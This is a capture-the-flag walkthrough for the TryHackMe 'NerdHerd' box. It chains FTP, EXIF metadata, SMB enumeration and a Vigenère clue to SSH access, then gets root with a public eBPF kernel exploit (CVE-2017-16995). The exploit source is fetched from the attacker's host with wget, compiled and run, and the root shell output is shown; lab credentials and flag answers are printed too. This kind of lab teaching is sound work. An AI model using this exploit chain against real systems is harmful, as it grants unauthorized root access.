# NerdHerd — TryHackMe Walkthrough

> Hack your way into this easy/medium level legendary TV series "Chuck" themed box!

<p align="center">
<a href="https://ibb.co/zTg1SM1x"><img src="https://i.ibb.co/1tN39g3Q/63f7ad45f1bec382a61db8f99ccb723e.png" alt="63f7ad45f1bec382a61db8f99ccb723e" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/nerdherd">
    <img src="https://img.shields.io/badge/TryHackMe-NerdHerd-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-FTP%20%7C%20Steganography%20%7C%20SMB%20%7C%20Vigenere%20%7C%20Kernel%20Exploit-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | FTP Anonymous Login and File Retrieval |
| 3 | Steganography — EXIF Metadata Extraction |
| 4 | SMB Enumeration with enum4linux |
| 5 | Cryptography — Base64 Decoding and Vigenère Cipher |
| 6 | Hidden Web Directory Discovery |
| 7 | CVE-2017-16995 — Linux Kernel < 4.13.9 Privilege Escalation |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate multiple services (FTP, SMB, HTTP) from a single Nmap scan
- Log into an anonymous FTP server and retrieve hidden files from dot-directories
- Extract metadata from image files using exiftool to find hidden clues
- Enumerate SMB shares and user accounts using enum4linux with RID cycling
- Decode Base64 strings and apply Vigenère decryption to recover credentials
- Access a password-protected SMB share and retrieve clues leading to SSH credentials
- Compile and run a public kernel exploit to escalate from user to root

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, ftp client, exiftool, enum4linux, smbclient, gcc, and Netcat installed

---

## Task 1 — PWN

---

### Step 1 — Network Enumeration with Nmap

**Approach:** Run an aggressive full-port Nmap scan with service detection, script scanning, and OS detection. The `-p-` flag ensures all 65535 ports are checked — non-standard ports like 1337 would be missed by a default scan.

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ sudo nmap -A -sS -sC -sV -Pn -p- Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 22:59 CET
Nmap scan report for Machine_IP
Host is up (0.050s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 pub
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|_  System time: 2020-10-31T22:01:04
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   32.15 ms 10.8.0.1
2   67.41 ms Machine_IP

Nmap done: 1 IP address (1 host up) scanned in 80.41 seconds
```

> **Note:** Five ports are open. **FTP on 21** allows anonymous login — an immediate entry point. **SSH on 22** will be used later once credentials are found. **SMB on 139/445** is worth enumerating for shares and users. **Apache on port 1337** (a non-standard port) serves only the default page for now, suggesting hidden content may exist underneath. The combination of these services means there are multiple parallel paths to investigate.

---

### Step 2 — FTP Anonymous Login and File Retrieval

**Approach:** Connect to FTP as `anonymous` with no password. Navigate into the `pub` directory and check for hidden dot-directories and files. Retrieve everything available.

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ ftp Machine_IP
Connected to Machine_IP.
220 (vsFTPd 3.0.3)
Name (Machine_IP:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 pub
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:45 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11 03:03 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14 18:35 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11 03:45 youfoundme.png
ftp> cd .jokesonyou
250 Directory successfully changed.
ftp> ls -la
-rw-r--r--    1 ftp      ftp            28 Sep 14 18:35 hellon3rd.txt
ftp> get hellon3rd.txt
150 Opening BINARY mode data connection for hellon3rd.txt (28 bytes).
226 Transfer complete.
28 bytes received in 0.08 secs (0.3231 kB/s)
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ cat hellon3rd.txt
all you need is in the leet
```

> **Note:** The FTP root only shows `pub` in a standard `ls` — the hidden dot-directory `.jokesonyou` only appears with `ls -la`. This is a common CTF trick: always use `-la` when listing FTP directories. The hint `all you need is in the leet` references the non-standard port 1337 (leet speak for "leet") — pointing us toward the Apache service on that port. Download `youfoundme.png` from `pub` as well for the next step.

---

### Step 3 — Steganography — Extracting EXIF Metadata

**Approach:** Run `exiftool` against `youfoundme.png` to extract all embedded metadata. Hidden clues are often placed in custom EXIF fields.

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ exiftool youfoundme.png
ExifTool Version Number         : 12.06
File Name                       : youfoundme.png
File Size                       : 88 kB
File Type                       : PNG
Image Width                     : 894
Image Height                    : 894
Color Type                      : RGB with Alpha
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2010-10-26T08:00:31-07:00
Datemodify                      : 2010-10-26T08:00:31-07:00
Software                        : www.inkscape.org
Owner Name                      : fijbxslz
Image Size                      : 894x894
```

> **Note:** The `Owner Name` field contains `fijbxslz` — a string that does not look like a real name. Running it through a cipher identifier (such as [boxentriq.com](https://www.boxentriq.com/code-breaking/cipher-identifier)) suggests it is Vigenère-encoded. This will be decrypted later once the key is found.

---

### Step 4 — SMB Enumeration with smbclient and enum4linux

**Approach:** List available SMB shares with `smbclient`, then run `enum4linux` for full enumeration including user discovery via RID cycling. The share `nerdherd_classified` initially denies access — credentials are needed.

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ smbclient -L \\Machine_IP
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        nerdherd_classified Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ smbclient \\\\Machine_IP\\nerdherd_classified
Enter WORKGROUP\kali's password:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

enum4linux reveals the system user:

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ enum4linux Machine_IP
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\chuck (Local User)
S-1-22-1-1002 Unix User\ftpuser (Local User)

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc:
...
```

> **Note:** enum4linux via RID cycling reveals two Unix users: **chuck** and **ftpuser**. The full name `ChuckBartowski` confirms the Chuck TV series theme. The `nerdherd_classified` share requires credentials — now that we have a username (`chuck`), we need to find the password. The next step involves decoding hidden hints found in the page source of the admin panel.

---

### Step 5 — Decoding Base64 Hints and Vigenère Decryption

**Approach:** The HTML source of the web application contains Base64-encoded strings hidden in a comment. Decode them, then use the Vigenère cipher with the key `BirdistheWord` (a reference to the Chuck TV show's recurring joke) to decrypt the `Owner Name` value recovered from EXIF metadata.

Base64 strings found in the page source comment:

```
Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
```

Decoding both:

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ echo 'Y2liYXJ0b3dza2k=' | base64 -d
cibartowski
kali@kali:~/CTFs/tryhackme/NerdHerd$ echo 'aGVoZWdvdTwdasddHlvdQ==' | base64 -d
hehegou
```

Vigenère decoding `fijbxslz` with key `BirdistheWord` via [CyberChef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('BirdistheWord')&input=ZmlqYnhzbHo):

```
easypass
```

> **Note:** The Base64 strings in the page source are a red herring — they decode to nonsense. The real credential comes from decoding the EXIF `Owner Name` field `fijbxslz` as a Vigenère cipher. The key `BirdistheWord` is a nod to the Chuck episode where "Bird is the Word" becomes a running joke. Vigenère decryption with this key yields `easypass` — chuck's SMB password.

---

### Step 6 — Accessing the SMB Share and Discovering the Web Path

**Approach:** Log into the `nerdherd_classified` SMB share as `chuck` with the password `easypass`. Retrieve `secr3t.txt`, which contains a hidden web directory path. Browse to it and collect the SSH credentials stored there.

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ smbclient -U chuck \\\\Machine_IP\\nerdherd_classified
Enter WORKGROUP\chuck's password:
smb: \> ls
  .                                   D        0  Fri Sep 11 03:29:53 2020
  ..                                  D        0  Thu Nov  5 21:44:40 2020
  secr3t.txt                          N      125  Fri Sep 11 03:29:53 2020
smb: \> get secr3t.txt
getting file \secr3t.txt of size 125 as secr3t.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

`secr3t.txt` reveals a hidden web directory: `http://Machine_IP:1337/this1sn0tadirect0ry/`

Browsing to `http://Machine_IP:1337/this1sn0tadirect0ry/creds.txt`:

```
alright, enough with the games.

here, take my ssh creds:

	chuck : th1s41ntmypa5s
```

> **Note:** The SMB share contains a file pointing to a hidden path on the Apache server running on port 1337 — connecting the "leet" hint from the FTP file earlier. The `creds.txt` file in that directory provides plaintext SSH credentials. This multi-step chain (FTP hint → leet port → SMB → hidden web path → SSH creds) is a good example of how real-world CTF puzzles chain multiple services together.

---

### Step 7 — SSH Login and User Flag

**Approach:** Use the recovered credentials to log in via SSH and read the user flag.

```
kali@kali:~/CTFs/tryhackme/NerdHerd$ ssh chuck@Machine_IP
chuck@Machine_IP's password:
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

Last login: Wed Oct 14 17:03:42 2020 from 22.0.97.11
chuck@nerdherd:~$ cat user.txt
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
```

> **Note:** The kernel version in the login banner — `4.4.0-31-generic` — is immediately significant. This falls within the vulnerable range for **CVE-2017-16995** (Linux Kernel < 4.13.9), which allows local privilege escalation via a BPF (Berkeley Packet Filter) verifier bypass. The exploit is publicly available on [Exploit-DB as entry 45010](https://www.exploit-db.com/exploits/45010).

---

### Question 1 — User Flag

<details><summary>Reveal Answer</summary>

`THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}`

</details>

---

### Step 8 — Privilege Escalation via CVE-2017-16995 (Kernel < 4.13.9)

**Approach:** Confirm that `gcc` is available on the target, then download the exploit source, compile it, and run it. After obtaining a root shell, locate the real root flag — it is not in the standard `/root/root.txt` location.

```
chuck@nerdherd:~$ which gcc
/usr/bin/gcc
chuck@nerdherd:~$ wget YOUR_IP/45010.c
--2020-11-06 15:18:07--  http://YOUR_IP/45010.c
Connecting to YOUR_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13728 (13K) [text/plain]
Saving to: '45010.c'

45010.c                100%[==========================>]  13,41K  --.-KB/s    in 0,03s

2020-11-06 15:18:07 (408 KB/s) - '45010.c' saved [13728/13728]

chuck@nerdherd:~$ gcc 45010.c -o exploit
chuck@nerdherd:~$ ./exploit
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003b52f200
[*] Leaking sock struct from ffff88003c882d00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88003afbc780
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88003afbc780
[*] credentials patched, launching shell...
# whoami
root
# cat /root/root.txt
cmon, wouldnt it be too easy if i place the root flag here?

# locate root.txt
/opt/.root.txt
/root/root.txt
# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
# cd /root
# cat .bash_history | grep -i -a thm
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
```

> **Note:** CVE-2017-16995 abuses a flaw in the Linux kernel's eBPF verifier — the component responsible for ensuring BPF programs are safe to run. By crafting a malicious BPF program that passes verification but manipulates kernel memory at runtime, the exploit patches the current process's credential structure directly in kernel memory, changing the UID to 0 (root). The `gcc` binary being available on the target is important — without a compiler, the exploit would need to be pre-compiled on a matching architecture. The real root flag is hidden at `/opt/.root.txt` rather than the expected `/root/root.txt`. A bonus flag is also discoverable in root's `.bash_history` file.

---

### Question 2 — Root Flag

<details><summary>Reveal Answer</summary>

`THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}`

</details>

---

### Question 3 — Bonus Flag

<details><summary>Reveal Answer</summary>

`THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}`

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap full-port scan | Found FTP (21), SSH (22), SMB (139/445), Apache on port 1337 |
| 2 | FTP anonymous login | Retrieved `hellon3rd.txt` hinting at port 1337; retrieved `youfoundme.png` |
| 3 | exiftool metadata extraction | Found `Owner Name: fijbxslz` hidden in EXIF data |
| 4 | SMB enumeration with enum4linux | Discovered user `chuck`; found locked `nerdherd_classified` share |
| 5 | Base64 decode + Vigenère decryption | Decoded EXIF owner name to `easypass` using key `BirdistheWord` |
| 6 | SMB share access as `chuck` | Retrieved `secr3t.txt` revealing hidden web path; collected SSH credentials |
| 7 | SSH login as `chuck` | Retrieved user flag; identified vulnerable kernel version 4.4.0-31 |
| 8 | CVE-2017-16995 kernel exploit (Exploit-DB 45010) | Escalated to root; retrieved root flag from `/opt/.root.txt` and bonus flag from `.bash_history` |
